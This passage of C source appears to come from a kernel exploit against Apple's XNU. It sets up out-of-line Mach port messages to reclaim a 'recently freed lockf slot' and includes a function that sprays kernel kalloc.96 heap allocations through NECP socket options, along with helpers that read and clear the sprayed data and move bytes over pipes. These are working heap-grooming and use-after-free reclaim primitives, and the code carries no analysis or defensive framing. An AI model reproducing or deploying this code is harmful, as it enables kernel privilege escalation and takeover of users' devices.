    holder->hold_message_template.descriptor.deallocate = false;
    holder->hold_message_template.descriptor.copy = MACH_MSG_PHYSICAL_COPY;
    holder->hold_message_template.descriptor.disposition = MACH_MSG_TYPE_COPY_SEND;
    holder->hold_message_template.descriptor.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    holder->hold_message_template.descriptor.count = port_cnt;

    for (unsigned int i = 0; i < OOL_HOLDER_QUEUE_COUNT; i++) {
        mach_port_limits_t limits = {
            .mpl_qlimit = OOL_HOLDER_ENTRY_COUNT,
        };

        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &holder->message_queue_ports[i]);
        if (kr != KERN_SUCCESS) {
            destroy_lockf_slot_ool_holder(holder);
            return -1;
        }

        holder->allocated_queue_port_count++;

        kr = mach_port_set_attributes(mach_task_self(), holder->message_queue_ports[i], MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);
        if (kr != KERN_SUCCESS) {
            destroy_lockf_slot_ool_holder(holder);
            return -1;
        }
    }

    return 0;
}

void destroy_lockf_slot_ool_holder(struct lockf_slot_ool_holder *holder) {
    for (unsigned int i = 0; i < holder->allocated_queue_port_count; i++) {
        if (MACH_PORT_VALID(holder->message_queue_ports[i])) {
            mach_port_mod_refs(mach_task_self(), holder->message_queue_ports[i], MACH_PORT_RIGHT_RECEIVE, -1);
        }
    }
    memset(holder, 0, sizeof(*holder));
}

kern_return_t queue_ool_port_array_to_hold_recently_freed_lockf_slot(struct lockf_slot_ool_holder *holder)
{
    struct default_msg message;
    message = holder->hold_message_template;
    message.header.msgh_remote_port = holder->message_queue_ports[0];
    message.header.msgh_local_port = MACH_PORT_NULL;
    message.header.msgh_voucher_port = MACH_PORT_NULL;

    return mach_msg(
        &message.header,
        MACH_SEND_MSG | MACH_SEND_NOIMPORTANCE,
        message.header.msgh_size,
        0,
        MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL);
}

#include "pipe.h"
#include <errno.h>
#include <unistd.h>
#include <stdint.h>

int write_pipe_fd(int fd, const void *buffer, size_t size)
{
    const uint8_t *cursor = buffer;
    size_t written = 0;

    while (written < size) {
        ssize_t amount = write(fd, cursor + written, size - written);
        if (amount < 0) {
            if (errno == EINTR) {
                continue;
            }
            return -1;
        }
        if (amount == 0) {
            errno = EIO;
            return -1;
        }
        written += (size_t)amount;
    }

    return 0;
}

int read_pipe_fd(int fd, void *buffer, size_t size)
{
    uint8_t *cursor = buffer;
    size_t received = 0;

    while (received < size) {
        ssize_t amount = read(fd, cursor + received, size - received);
        if (amount < 0) {
            if (errno == EINTR) {
                continue;
            }
            return -1;
        }
        if (amount == 0) {
            errno = EIO;
            return -1;
        }
        received += (size_t)amount;
    }

    return 0;
}

int spray_default_kalloc_96_via_necp(int socket_fd, const uint8_t payload[NECP_DOMAIN_PAYLOAD_SIZE])
{
    struct necp_domain_option option = {0};

    option.type = NECP_TLV_ATTRIBUTE_DOMAIN;    // 7
    option.length = NECP_DOMAIN_STRING_LENGTH;  // 0x5F
    memcpy(option.value, payload, NECP_DOMAIN_STRING_LENGTH);

    return setsockopt(socket_fd, SOL_SOCKET, SO_NECP_ATTRIBUTES, &option, (socklen_t)sizeof(option));
}

int read_necp_domain(int socket_fd, uint8_t payload[NECP_DOMAIN_PAYLOAD_SIZE], uint32_t *domain_length)
{
    uint8_t option[0x103] = {0};
    socklen_t option_length = (socklen_t)sizeof(option);
    uint32_t length = 0;
    
    if (getsockopt(socket_fd,
                   SOL_SOCKET,             // 0xffff
                   SO_NECP_ATTRIBUTES,     // 0x1109
                   option,
                   &option_length) != 0)
    {
        return -1;
    }
    
    memcpy(&length, option + 1, sizeof(length));
    
    memset(payload, 0, NECP_DOMAIN_PAYLOAD_SIZE);
    memcpy(payload, option + 5, length);
    *domain_length = length;
    return 0;
}

int clear_necp_domain(int necp_socket)
{
    struct {
        uint8_t type;
        uint32_t length;
    } __attribute__((packed)) option = {
        .type = NECP_TLV_ATTRIBUTE_DOMAIN,
        .length = 0,
    };

    return setsockopt(
        necp_socket,
        SOL_SOCKET,
        SO_NECP_ATTRIBUTES,
        &option,
        (socklen_t)sizeof(option));
}
